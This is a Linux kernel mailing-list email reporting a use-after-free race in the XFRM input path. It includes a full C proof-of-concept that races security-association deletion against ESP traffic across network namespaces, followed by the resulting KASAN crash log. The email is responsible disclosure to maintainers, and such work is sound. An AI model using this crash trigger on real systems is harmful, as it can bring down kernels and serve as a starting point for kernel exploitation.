Received: from mail-pj1-f52.google.com (mail-pj1-f52.google.com [209.85.216.52])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CD40E18AE3
	for <netdev@vger.kernel.org>; Sat, 22 Aug 2026 07:03:00 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.52
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787382182; cv=none; b=iQhL62kb+OdThrbUpDHSUBAwt7IMYMlxINLn7HYf4zEgwEPrFjDEaDhkLInvyDrUhHe9ujDkMy0lHf9PIZ34yoT0ksq530Nb6D65bJDekVGlJF81dTVQDWDdEAe+fUrukmYjvt7blkr9uZie9K7dk+V9CuLK05/iwVy7d+/dq1s=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787382182; c=relaxed/simple;
	bh=xyTa1zFjN0gCpKBz/YuIwS40NeQN9+wiaF6L+kOHM9A=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=NPN0v9gqjVhCt6y4yYe3o9IbS93AdDHMZcqMoIkWTK+wb6Q6nTm4jqQmBWilPEfkPUtWH2/J8jWA/DGvZuAUSa8yDQp/DuBemh8xua9vCivm8SLb5xJ92FEr7n0Vmr5V1oNccUIZX8uCX/Xn250qjeG3LVrmRuXweDZ3yhvK4xM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; arc=none smtp.client-ip=209.85.216.52
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Received: by mail-pj1-f52.google.com with SMTP id 98e67ed59e1d1-39266382df6so1415660a91.3
        for <netdev@vger.kernel.org>; Sat, 22 Aug 2026 00:03:00 -0700 (PDT)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787382180; x=1787986980;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=IoTQb5o7qm+tPf09Rc5IJKjSIhYiXAiZgd3P/Oe5q0g=;
        b=XcNeTA4D/WYdFYxvbhHG02fhS0/Z6ixNEvBxnC3wsxy5E+vohMFQrnA7Se/Cj/pdvH
         9H6CGa9wMvw6SFDQW3MxItNT3nS84cfNgRmllO4bW2yt8beua0VwbfiYbnw44sVjQP0L
         IloE5EqSErGUvCCnSYwTClDmtpLV4kwpLMeW9HvpFjdkdlMrrECG3iYXUp6Wu002APs8
         11HkI4Joyx1LQ/48d2Z3JDYOhWp8SYFdldBC94l6rw3wZPPYf0IioT+2X+SwOjLXGYcB
         ziLVZCWg0Wz3Et6NicywuqYs71mD196k1Nu+iufHePhxmvkb18DoLDRUWG6V5QhODAhx
         HOTw==
X-Forwarded-Encrypted: i=1; AHgh+RrNtXcuBjagc4mA7wxSTQtuD7wSwSBq/202KQgvP0BRHlD1peuccyRvrQnaQNYNMyLMWiLKgcU=@vger.kernel.org
X-Gm-Message-State: AFuF++k9BYuaOMANXwnESIv7pOFid8ViwiyIdKZ+Y+gThOH7sR0wgyGS
	4c14/02SJcPa7UWkONQzsPH/1LFxvQn49YS3GSJxnPfkh2IC0VHB2A/x+7SkbkjFACFF
X-Gm-Gg: AR+sD102VCCj0kA6hqAJhKOPFpUiXDZ4HQYAQ9zDKNFC6RtTObrAe0Id1v1eoghGJ8F
	zLQ3qQXtu+Up/WhT/veLea/hIaVZ7xSiCzqyLwAE/OmBFHvIUlS1K7ZIE8S4GqQSSDNb4sD5Em0
	KH0VDssiCPZHO6fanCFhtCnx01YEB7PSCBQe/KEwKM5PqAWmVCviLZfWeoijLhspcudCbadDL4r
	dOVxfOLATtq4zhfoW9PTmVZUVgYTUuKxGVAhkMXKYvlZ4VJrLhT7rJS5w4HUYlWH7HlsU0US9Lt
	eOnR2g3uEj8LY4osb83Xxj8T1bxRkGaEHfYTF9N5soObCic+Aw9nH6siFNeSPogKVLDiUbphTfv
	FLgUcqc7aTSuTjdOb+Z1Fxqm1P6c+fYabuOTiOE29LK2zFiFO/RYQ/1zNmif0b4CIYBEtYxk1Lr
	8ORKElWAocdXCJwOykPGBSGetJ1kG/IGTrOxLjcZfdcAy86w==
X-Received: by 2002:a17:90b:558b:b0:37f:fdc8:71b4 with SMTP id 98e67ed59e1d1-395c33371a9mr22844769a91.2.1787382179742;
        Sat, 22 Aug 2026 00:02:59 -0700 (PDT)
Received: from Roxy.localdomain ([2602:feda:30:ae86:2bd:64ff:feda:6b7b])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-327f90999fcsm3315904eec.1.2026.08.22.00.02.55
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 22 Aug 2026 00:02:58 -0700 (PDT)
From: Zhiling Zou zhilinz@nebusec.ai
To: steffen.klassert@secunet.com,
	netdev@vger.kernel.org
Cc: herbert@gondor.apana.org.au,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net v3 0/1] xfrm: save input state data before secpath resets
Date: Sat, 22 Aug 2026 15:02:43 +0800
Message-ID: <cover.1787381531.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in net/xfrm/xfrm_input.c. The attached
crash was reproduced as root in a network-namespace XFRM interface topology.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

xfrm_input() stores the current xfrm_state in the skb secpath while it
continues receive-side processing. Some input paths can reset that secpath
before xfrm_input() has finished dereferencing the state.

Receive callback users such as VTI and XFRM interfaces can scrub packets
that cross network namespaces with secpath_reset(). The XFRM_MAX_DEPTH error
path can also reset the secpath before the final drop callback reads the
current state's type.

If secpath_reset() drops the last state reference while the state is
concurrently deleted, xfrm_input() can still dereference the freed state
when selecting transport_finish() or reporting the drop callback protocol.

The fix saves the state protocol before a path can reset the secpath and
uses the saved address family for transport_finish(). A larval
XFRM_STATE_ACQ state has no type, so the fix retains nexthdr as its
protocol. This preserves the existing drop-path fallback while avoiding
post-reset state dereferences without per-packet state refcounting.

Reproducer:

    make
    ./poc 180

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define SRC_IP "198.51.100.2"
#define DST_IP "198.51.100.1"
#define IF_ID 0x1u
#define REAL_SPI 0x100u
#define DUMMY_SPI_BASE 0x200u
#define DUMMY_SPI_COUNT 4u
#define SENDER_CHILDREN 8
#define PAYLOAD_LEN 1472
#define DEFAULT_RUNTIME_SEC 180

static volatile sig_atomic_t stop_flag;
static uint32_t nl_seq = 1;

static const uint8_t auth_key[32] = {
	0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
	0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
	0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
	0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
};

static const uint8_t enc_key[16] = {
	0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
	0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
};

static void on_signal(int sig)
{
	(void)sig;
	stop_flag = 1;
}

static void die(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vfprintf(stderr, fmt, ap);
	va_end(ap);
	fputc('\n', stderr);
	exit(1);
}

static void run_cmd(const char *fmt, ...)
{
	char cmd[2048];
	va_list ap;
	int rc;

	va_start(ap, fmt);
	vsnprintf(cmd, sizeof(cmd), fmt, ap);
	va_end(ap);

	rc = system(cmd);
	if (rc != 0)
		die("command failed (%d): %s", rc, cmd);
}

static void best_effort_cmd(const char *fmt, ...)
{
	char cmd[2048];
	va_list ap;

	va_start(ap, fmt);
	vsnprintf(cmd, sizeof(cmd), fmt, ap);
	va_end(ap);
	if (system(cmd) < 0)
		perror("system");
}

static int open_xfrm_nl(void)
{
	int fd;
	struct sockaddr_nl addr = {
		.nl_family = AF_NETLINK,
	};

	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_XFRM);
	if (fd < 0)
		die("socket(NETLINK_XFRM): %s", strerror(errno));
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind(NETLINK_XFRM): %s", strerror(errno));

	return fd;
}

static void addattr_l(struct nlmsghdr *nlh, size_t maxlen, int type,
		      const void *data, size_t alen)
{
	size_t len = RTA_LENGTH(alen);
	struct rtattr *rta;

	if (NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len) > maxlen)
		die("netlink attribute overflow");

	rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = len;
	if (alen)
		memcpy(RTA_DATA(rta), data, alen);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len);
}

static int xfrm_ack(int fd, uint32_t seq)
{
	char buf[8192];
	ssize_t len;
	struct nlmsghdr *nlh;

	for (;;) {
		len = recv(fd, buf, sizeof(buf), 0);
		if (len < 0) {
			if (errno == EINTR)
				continue;
			return -errno;
		}

		for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, (unsigned int)len);
		     nlh = NLMSG_NEXT(nlh, len)) {
			struct nlmsgerr *err;

			if (nlh->nlmsg_seq != seq)
				continue;
			if (nlh->nlmsg_type != NLMSG_ERROR)
				continue;

			err = NLMSG_DATA(nlh);
			return err->error;
		}
	}
}

static int xfrm_send(int fd, struct nlmsghdr *nlh)
{
	struct sockaddr_nl nladdr = {
		.nl_family = AF_NETLINK,
	};
	struct iovec iov = {
		.iov_base = nlh,
		.iov_len = nlh->nlmsg_len,
	};
	struct msghdr msg = {
		.msg_name = &nladdr,
		.msg_namelen = sizeof(nladdr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	int err;

	if (sendmsg(fd, &msg, 0) < 0)
		return -errno;
	err = xfrm_ack(fd, nlh->nlmsg_seq);
	return err;
}

static int xfrm_add_sa(int fd, uint32_t spi, uint32_t if_id)
{
	struct {
		struct nlmsghdr nlh;
		struct xfrm_usersa_info xsinfo;
		char attrs[512];
	} req;
	struct {
		struct xfrm_algo_auth hdr;
		uint8_t key[sizeof(auth_key)];
	} auth = { 0 };
	struct {
		struct xfrm_algo hdr;
		uint8_t key[sizeof(enc_key)];
	} crypt = { 0 };
	uint32_t if_id_attr = if_id;

	memset(&req, 0, sizeof(req));
	req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req.xsinfo));
	req.nlh.nlmsg_type = XFRM_MSG_NEWSA;
	req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	req.nlh.nlmsg_seq = ++nl_seq;

	req.xsinfo.family = AF_INET;
	req.xsinfo.mode = XFRM_MODE_TRANSPORT;
	req.xsinfo.id.proto = IPPROTO_ESP;
	req.xsinfo.id.spi = htonl(spi);
	req.xsinfo.reqid = 1;
	req.xsinfo.sel.family = AF_INET;
	req.xsinfo.id.daddr.a4 = inet_addr(DST_IP);
	req.xsinfo.saddr.a4 = inet_addr(SRC_IP);
	memset(&req.xsinfo.lft, 0xff, sizeof(req.xsinfo.lft));

	strncpy(auth.hdr.alg_name, "hmac(sha256)", sizeof(auth.hdr.alg_name) - 1);
	auth.hdr.alg_key_len = sizeof(auth_key) * 8;
	auth.hdr.alg_trunc_len = 128;
	memcpy(auth.key, auth_key, sizeof(auth_key));

	strncpy(crypt.hdr.alg_name, "cbc(aes)", sizeof(crypt.hdr.alg_name) - 1);
	crypt.hdr.alg_key_len = sizeof(enc_key) * 8;
	memcpy(crypt.key, enc_key, sizeof(enc_key));

	addattr_l(&req.nlh, sizeof(req), XFRMA_ALG_AUTH_TRUNC, &auth, sizeof(auth));
	addattr_l(&req.nlh, sizeof(req), XFRMA_ALG_CRYPT, &crypt, sizeof(crypt));
	if (if_id)
		addattr_l(&req.nlh, sizeof(req), XFRMA_IF_ID, &if_id_attr,
			  sizeof(if_id_attr));

	return xfrm_send(fd, &req.nlh);
}

static int xfrm_del_sa(int fd, uint32_t spi)
{
	struct {
		struct nlmsghdr nlh;
		struct xfrm_usersa_id sa_id;
	} req;

	memset(&req, 0, sizeof(req));
	req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req.sa_id));
	req.nlh.nlmsg_type = XFRM_MSG_DELSA;
	req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	req.nlh.nlmsg_seq = ++nl_seq;

	req.sa_id.family = AF_INET;
	req.sa_id.proto = IPPROTO_ESP;
	req.sa_id.spi = htonl(spi);
	req.sa_id.daddr.a4 = inet_addr(DST_IP);

	return xfrm_send(fd, &req.nlh);
}

static void cleanup_env(void)
{
	best_effort_cmd("ip netns del A >/dev/null 2>&1");
	best_effort_cmd("ip netns del B >/dev/null 2>&1");
	best_effort_cmd("ip link del vethR >/dev/null 2>&1");
	best_effort_cmd("ip xfrm state flush >/dev/null 2>&1");
	best_effort_cmd("ip xfrm policy flush >/dev/null 2>&1");
}

static void setup_env(void)
{
	best_effort_cmd("sysctl -w kernel.panic_on_warn=0 >/dev/null 2>&1");
	cleanup_env();

	run_cmd("ip netns add A");
	run_cmd("ip netns add B");
	run_cmd("ip link add vethR type veth peer name vethS");
	run_cmd("ip link set vethS netns B");
	run_cmd("ip addr add %s/24 dev vethR", DST_IP);
	run_cmd("ip link set vethR up");
	run_cmd("ip -n B addr add %s/24 dev vethS", SRC_IP);
	run_cmd("ip -n B link set lo up");
	run_cmd("ip -n B link set vethS up");
	run_cmd("ip link add xfrm0 type xfrm if_id 0x%x dev vethR", IF_ID);
	run_cmd("ip link set xfrm0 netns A");
	run_cmd("ip -n A addr add %s/32 dev xfrm0", DST_IP);
	run_cmd("ip -n A link set lo up");
	run_cmd("ip -n A link set xfrm0 up");

	run_cmd("ip xfrm state add src %s dst %s proto esp spi 0x%x reqid 1 "
		"mode transport if_id 0x%x auth-trunc 'hmac(sha256)' "
		"0x1111111111111111111111111111111111111111111111111111111111111111 128 "
		"enc 'cbc(aes)' 0x22222222222222222222222222222222",
		SRC_IP, DST_IP, REAL_SPI, IF_ID);
	run_cmd("ip xfrm policy add dir in if_id 0x%x src %s/32 dst %s/32 "
		"tmpl src %s dst %s proto esp reqid 1 mode transport",
		IF_ID, SRC_IP, DST_IP, SRC_IP, DST_IP);
	run_cmd("ip -n A xfrm policy add dir in if_id 0x%x src %s/32 dst %s/32 "
		"tmpl src %s dst %s proto esp reqid 1 mode transport",
		IF_ID, SRC_IP, DST_IP, SRC_IP, DST_IP);
	run_cmd("ip -n B xfrm state add src %s dst %s proto esp spi 0x%x reqid 1 "
		"mode transport auth-trunc 'hmac(sha256)' "
		"0x1111111111111111111111111111111111111111111111111111111111111111 128 "
		"enc 'cbc(aes)' 0x22222222222222222222222222222222",
		SRC_IP, DST_IP, REAL_SPI);
	run_cmd("ip -n B xfrm policy add dir out src %s/32 dst %s/32 tmpl "
		"src %s dst %s proto esp reqid 1 mode transport",
		SRC_IP, DST_IP, SRC_IP, DST_IP);
}

static void enter_netns(const char *name)
{
	char path[128];
	const char *base = getenv("IP_NETNS_DIR");
	int fd;

	if (!base || !*base)
		base = "/var/run/netns";
	snprintf(path, sizeof(path), "%s/%s", base, name);
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("open(%s): %s", path, strerror(errno));
	if (setns(fd, CLONE_NEWNET) < 0)
		die("setns(%s): %s", name, strerror(errno));
	close(fd);
}

static void sender_loop(unsigned int cpu_hint)
{
	struct sockaddr_in src = {
		.sin_family = AF_INET,
		.sin_port = htons(40000 + cpu_hint),
	};
	struct sockaddr_in dst = {
		.sin_family = AF_INET,
		.sin_port = htons(9),
	};
	cpu_set_t set;
	uint8_t payload[PAYLOAD_LEN];
	int one = 1;
	int fd;
	ssize_t ret;

	enter_netns("B");

	CPU_ZERO(&set);
	CPU_SET(cpu_hint % 4, &set);
	(void)sched_setaffinity(0, sizeof(set), &set);

	fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("sender socket: %s", strerror(errno));
	(void)setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	src.sin_addr.s_addr = inet_addr(SRC_IP);
	dst.sin_addr.s_addr = inet_addr(DST_IP);
	if (bind(fd, (struct sockaddr *)&src, sizeof(src)) < 0)
		die("sender bind: %s", strerror(errno));
	if (connect(fd, (struct sockaddr *)&dst, sizeof(dst)) < 0)
		die("sender connect: %s", strerror(errno));

	memset(payload, 0x41 + (cpu_hint & 0xf), sizeof(payload));

	while (!stop_flag) {
		ret = send(fd, payload, sizeof(payload), 0);
		if (ret >= 0)
			continue;
		if (errno == EINTR)
			continue;
		if (errno == ENOBUFS || errno == EAGAIN) {
			usleep(50);
			continue;
		}
	}

	close(fd);
	_exit(0);
}

static pid_t spawn_sender(unsigned int cpu_hint)
{
	pid_t pid = fork();

	if (pid < 0)
		die("fork: %s", strerror(errno));
	if (pid == 0)
		sender_loop(cpu_hint);
	return pid;
}

static void stop_children(pid_t *pids, size_t nr)
{
	size_t i;

	for (i = 0; i < nr; i++) {
		if (pids[i] > 0)
			kill(pids[i], SIGTERM);
	}
	for (i = 0; i < nr; i++) {
		if (pids[i] > 0)
			waitpid(pids[i], NULL, 0);
	}
}

static double now_sec(void)
{
	struct timespec ts;

	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec + ts.tv_nsec / 1e9;
}

int main(int argc, char **argv)
{
	struct sigaction sa = {
		.sa_handler = on_signal,
	};
	pid_t senders[SENDER_CHILDREN] = { 0 };
	unsigned int runtime_sec = DEFAULT_RUNTIME_SEC;
	unsigned long long iters = 0;
	unsigned long long readds = 0;
	unsigned long long deletes = 0;
	unsigned int i;
	double start, last_report, deadline;
	int xfd;

	if (argc > 1) {
		runtime_sec = (unsigned int)strtoul(argv[1], NULL, 0);
		if (!runtime_sec)
			runtime_sec = DEFAULT_RUNTIME_SEC;
	}

	sigemptyset(&sa.sa_mask);
	sigaction(SIGINT, &sa, NULL);
	sigaction(SIGTERM, &sa, NULL);

	setup_env();
	xfd = open_xfrm_nl();

	for (i = 0; i < SENDER_CHILDREN; i++)
		senders[i] = spawn_sender(i);

	start = now_sec();
	last_report = start;
	deadline = start + runtime_sec;

	fprintf(stderr,
		"running for %u seconds with %u sender children, async ESP transport path\n",
		runtime_sec, SENDER_CHILDREN);

	while (!stop_flag && now_sec() < deadline) {
		int err;

		err = xfrm_del_sa(xfd, REAL_SPI);
		if (!err || err == -ESRCH)
			deletes++;

		if ((iters & 0x3f) == 0) {
			for (i = 0; i < DUMMY_SPI_COUNT; i++) {
				(void)xfrm_add_sa(xfd, DUMMY_SPI_BASE + i, IF_ID);
				(void)xfrm_del_sa(xfd, DUMMY_SPI_BASE + i);
			}
		}

		err = xfrm_add_sa(xfd, REAL_SPI, IF_ID);
		if (!err || err == -EEXIST)
			readds++;

		iters++;
		if (now_sec() - last_report >= 1.0) {
			fprintf(stderr, "iters=%llu deletes=%llu readds=%llu\n",
				iters, deletes, readds);
			last_report = now_sec();
		}
	}

	stop_flag = 1;
	stop_children(senders, SENDER_CHILDREN);
	close(xfd);

	fprintf(stderr, "final iters=%llu deletes=%llu readds=%llu\n",
		iters, deletes, readds);
	cleanup_env();
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  957.602283][    C3] Oops: general protection fault, probably for non-canonical address 0xfbd59c0000000024: 0000 [#1] SMP KASAN NOPTI
[  957.603261][    C3] KASAN: maybe wild-memory-access in range [0xdead000000000120-0xdead000000000127]
[  957.603885][    C3] CPU: 3 UID: 0 PID: 3308 Comm: poc Not tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
[  957.604578][    C3] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  957.605417][    C3] RIP: 0010:xfrm_input_state_lookup (/home/roxy/linux-block-patch/build/../include/linux/rcupdate.h:839 (discriminator 5) /home/roxy/linux-block-patch/build/../net/xfrm/xfrm_state.c:1212 (discriminator 5))
[  957.607153][    C3] RSP: 0018:ffffc900002d8760 EFLAGS: 00010216
[  957.607549][    C3] RAX: dffffc0000000000 RBX: ffffffff8bbc1e80 RCX: 1bd5a00000000024
[  957.608070][    C3] RDX: 1ffffffff17783d8 RSI: 1ffff110234cfae4 RDI: ffff88810fe4eca0
[  957.608581][    C3] RBP: dead000000000122 R08: 1ffff110234cfada R09: fffffbfff16350f5
[  957.609102][    C3] R10: ffffffff8b1a87af R11: 0000000000000001 R12: 0000000000000000
[  957.609635][    C3] R13: ffff88810fe4ec40 R14: ffff88810fe4ec98 R15: fffffbfff17783d9
[  957.610165][    C3] FS:  00007d7b22417740(0000) GS:ffff88811a600000(0000) knlGS:0000000000000000
[  957.610739][    C3] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  957.611171][    C3] CR2: 00007ae4fcdebd70 CR3: 00000001095ae001 CR4: 0000000000770ef0
[  957.611680][    C3] PKRU: 55555554
[  957.611922][    C3] Call Trace:
[  957.612141][    C3]  <IRQ>
[  957.613478][    C3]  xfrm_input (/home/roxy/linux-block-patch/build/../net/xfrm/xfrm_input.c:564)
[  957.616880][    C3]  xfrm4_esp_rcv (/home/roxy/linux-block-patch/build/../net/ipv4/xfrm4_protocol.c:103 (discriminator 24))
[  957.617177][    C3]  ip_protocol_deliver_rcu (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/atomic.h:93 (discriminator 4) /home/roxy/linux-block-patch/build/../include/linux/atomic/atomic-arch-fallback.h:949 (discriminator 4) /home/roxy/linux-block-patch/build/../include/linux/atomic/atomic-instrumented.h:401 (discriminator 4) /home/roxy/linux-block-patch/build/../include/linux/refcount.h:389 (discriminator 4) /home/roxy/linux-block-patch/build/../include/linux/refcount.h:432 (discriminator 4) /home/roxy/linux-block-patch/build/../include/linux/refcount.h:450 (discriminator 4) /home/roxy/linux-block-patch/build/../include/linux/netfilter/nf_conntrack_common.h:36 (discriminator 4) /home/roxy/linux-block-patch/build/../include/linux/skbuff.h:5138 (discriminator 4) /home/roxy/linux-block-patch/build/../net/ipv4/ip_input.c:205 (discriminator 4))
[  957.617549][    C3]  ip_local_deliver_finish (/home/roxy/linux-block-patch/build/../include/linux/skbuff.h:2840 /home/roxy/linux-block-patch/build/../net/ipv4/ip_input.c:238)
[  957.617904][    C3]  ip_local_deliver (/home/roxy/linux-block-patch/build/../include/net/dst.h:480 (discriminator 3) /home/roxy/linux-block-patch/build/../net/ipv4/ip_input.c:623 (discriminator 3))
[  957.620423][    C3]  ip_rcv (/home/roxy/linux-block-patch/build/../include/net/l3mdev.h:189 (discriminator 1) /home/roxy/linux-block-patch/build/../include/net/l3mdev.h:198 (discriminator 1) /home/roxy/linux-block-patch/build/../net/ipv4/ip_input.c:486 (discriminator 1) /home/roxy/linux-block-patch/build/../include/linux/netfilter.h:318 (discriminator 1) /home/roxy/linux-block-patch/build/../include/linux/netfilter.h:312 (discriminator 1) /home/roxy/linux-block-patch/build/../net/ipv4/ip_input.c:612 (discriminator 1))
[  957.624573][    C3]  __netif_receive_skb_one_core (/home/roxy/linux-block-patch/build/../net/core/dev.c:6205)
[  957.626984][    C3]  process_backlog (/home/roxy/linux-block-patch/build/../include/linux/local_lock_internal.h:61 /home/roxy/linux-block-patch/build/../net/core/dev.c:6664)
[  957.628857][    C3]  net_rx_action (/home/roxy/linux-block-patch/build/../include/linux/netpoll.h:83 /home/roxy/linux-block-patch/build/../net/core/dev.c:7791 /home/roxy/linux-block-patch/build/../net/core/dev.c:7950)
[  957.631707][    C3]  handle_softirqs (/home/roxy/linux-block-patch/build/../kernel/softirq.c:616)
[  957.632713][    C3]  do_softirq.part.0+0x3f/0xa0
[  957.633041][    C3]  </IRQ>
[  957.633242][    C3]  <TASK>
[  957.633439][    C3]  __local_bh_enable_ip (/home/roxy/linux-block-patch/build/../kernel/softirq.c:437 (discriminator 1))
[  957.634122][    C3]  __dev_queue_xmit (/home/roxy/linux-block-patch/build/../net/core/dev.c:4323 /home/roxy/linux-block-patch/build/../net/core/dev.c:4793)
[  957.640097][    C3]  ip_finish_output2 (/home/roxy/linux-block-patch/build/../net/ipv4/ip_output.c:232 (discriminator 1))
[  957.642493][    C3]  ip_output (/home/roxy/linux-block-patch/build/../include/linux/netfilter.h:305 /home/roxy/linux-block-patch/build/../net/ipv4/ip_output.c:438)
[  957.643746][    C3]  xfrm_output_resume (/home/roxy/linux-block-patch/build/../net/xfrm/xfrm_output.c:230 /home/roxy/linux-block-patch/build/../net/xfrm/xfrm_output.c:417 /home/roxy/linux-block-patch/build/../net/xfrm/xfrm_output.c:458 /home/roxy/linux-block-patch/build/../net/xfrm/xfrm_output.c:509 /home/roxy/linux-block-patch/build/../net/xfrm/xfrm_output.c:589)
[  957.647765][    C3]  xfrm4_output (/home/roxy/linux-block-patch/build/../net/ipv4/xfrm4_output.c:33 (discriminator 1))
[  957.649055][    C3]  ip_send_skb (/home/roxy/linux-block-patch/build/../include/linux/skbuff.h:1165 /home/roxy/linux-block-patch/build/../include/net/dst.h:470 /home/roxy/linux-block-patch/build/../net/ipv4/ip_output.c:131 /home/roxy/linux-block-patch/build/../net/ipv4/ip_output.c:1508)
[  957.650379][    C3]  udp_send_skb (/home/roxy/linux-block-patch/build/../net/ipv4/udp.c:1117 (discriminator 8))
[  957.650679][    C3]  udp_sendmsg (/home/roxy/linux-block-patch/build/../include/linux/rcupdate.h:871 /home/roxy/linux-block-patch/build/../include/net/l3mdev.h:102 /home/roxy/linux-block-patch/build/../net/ipv4/udp.c:1387)
[  957.655598][    C3]  __sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:787 (discriminator 1) /home/roxy/linux-block-patch/build/../net/socket.c:802 (discriminator 1) /home/roxy/linux-block-patch/build/../net/socket.c:2265 (discriminator 1))
[  957.657371][    C3]  __x64_sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:2272 /home/roxy/linux-block-patch/build/../net/socket.c:2268 /home/roxy/linux-block-patch/build/../net/socket.c:2268)
[  957.658374][    C3]  do_syscall_64 (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/entry-common.h:43 (discriminator 3) /home/roxy/linux-block-patch/build/../include/linux/irq-entry-common.h:100 (discriminator 3) /home/roxy/linux-block-patch/build/../include/linux/entry-common.h:174 (discriminator 3) /home/roxy/linux-block-patch/build/../arch/x86/entry/syscall_64.c:89 (discriminator 3))
[  957.658671][    C3]  entry_SYSCALL_64_after_hwframe (/home/roxy/linux-block-patch/build/../arch/x86/entry/entry_64.S:121)
[  957.659068][    C3] RIP: 0033:0x7d7b224a9687
[  957.660621][    C3] RSP: 002b:00007fff90945990 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  957.661172][    C3] RAX: ffffffffffffffda RBX: 00007d7b22417740 RCX: 00007d7b224a9687
[  957.661681][    C3] RDX: 0000000000000578 RSI: 00007fff90945b60 RDI: 0000000000000004
[  957.662218][    C3] RBP: 0000000000000004 R08: 0000000000000000 R09: 0000000000000000
[  957.662726][    C3] R10: 0000000000000000 R11: 0000000000000202 R12: 00007fff90945b60
[  957.663248][    C3] R13: 0000000000000003 R14: 000056c6b7669030 R15: 0000000000000000
[  957.663795][    C3]  </TASK>
[  957.663994][    C3] Modules linked in:
[  957.664374][    C3] ---[ end trace 0000000000000000 ]---
[  957.664753][    C3] RIP: 0010:xfrm_input_state_lookup (/home/roxy/linux-block-patch/build/../include/linux/rcupdate.h:839 (discriminator 5) /home/roxy/linux-block-patch/build/../net/xfrm/xfrm_state.c:1212 (discriminator 5))
[  957.665179][    C3] Code: 4d 8d 75 58 4c 89 f1 48 c1 e9 03 80 3c 01 00 0f 85 50 02 00 00 48 89 e9 4d 8b 65 58 48 b8 00 00 00 00 00 fc ff df 48 c1 e9 03 <80> 3c 01 00 0f 85 48 02 00 00 4c 89 65 00 4d 85 e4 74 25 48 b8 00
All code
========
   0:	4d 8d 75 58          	lea    0x58(%r13),%r14
   4:	4c 89 f1             	mov    %r14,%rcx
   7:	48 c1 e9 03          	shr    $0x3,%rcx
